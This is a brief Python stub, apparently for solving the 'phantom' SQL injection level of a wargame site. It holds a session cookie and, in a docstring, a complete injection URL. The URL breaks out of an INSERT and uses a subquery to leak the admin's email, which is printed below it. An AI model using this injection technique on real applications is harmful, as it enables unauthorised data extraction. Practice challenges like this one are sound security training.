from requests import Session, request
from time import sleep, time

URL = "https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php"
cookie = {"PHPSESSID": "6flgnknob1pkk0tu6g2cp4rtp7"}

PWLength = 0  # ?
FLAG = ""
tmp = ""
"""


https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php?joinmail=%27),(0,%2714.52.166.25%27,(select%20g.email%20from%20prob_phantom%20as%20g%20%20where%20no%20=1))%23

admin_secure_email@rubiya.kr

"""